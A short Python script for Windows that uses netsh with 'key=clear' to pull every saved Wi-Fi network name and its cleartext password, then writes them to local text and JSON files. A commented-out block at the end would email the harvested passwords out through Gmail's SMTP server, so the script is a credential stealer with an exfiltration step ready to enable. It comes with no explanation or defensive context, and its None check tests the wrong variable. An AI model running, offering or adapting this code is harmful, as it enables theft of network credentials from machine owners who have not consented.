
import subprocess
import re
import json
import smtplib,ssl

command_output = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output=True).stdout.decode()
profile_names = (re.findall(" All User Profile     : (.*)\r", command_output))
wifi_list = list()
if len(profile_names)!=0:
    for name in profile_names:
        profile_info = subprocess.run(["netsh", "wlan", "show", "profile", name], capture_output=True).stdout.decode()
        wifi_profile = dict()
        if re.search("Security key           : Absent", profile_info):
            continue
        else:
            wifi_profile['SSID'] = name
            profile_info_password = subprocess.run(["netsh","wlan", "show", "profile", name, "key=clear"], capture_output=True).stdout.decode()
            password = re.search("Key Content            : (.*)\r", profile_info_password)
            if profile_info_password == None:
                wifi_profile['Password'] = None
            else:
                wifi_profile['Password'] = password[1]
        wifi_list.append(wifi_profile)
password_txt_file = open("wifi_password_get.txt", "w+")
for x in range(len(wifi_list)):
    password_txt_file.write("SSID : " + wifi_list[x]['SSID'] + " ,  Password : " + wifi_list[x]['Password'] + "\n")
password_txt_file.close()
json_data = json.dumps(wifi_list)
password_json_file = open('wifi_password_json_get.txt', "w+")
password_json_file.write(json_data)
password_json_file.close()
# body = str(json_data)
# test_body = "\r" + body
# port = 465  # For SSL
# smtp_server = "smtp.gmail.com"
# context = ssl.create_default_context()
# with smtplib.SMTP_SSL(smtp_server, port, context=context) as server:
#     server.login("smtpmail", "password")
#     server.sendmail("smtpemail", "senderemail", test_body)
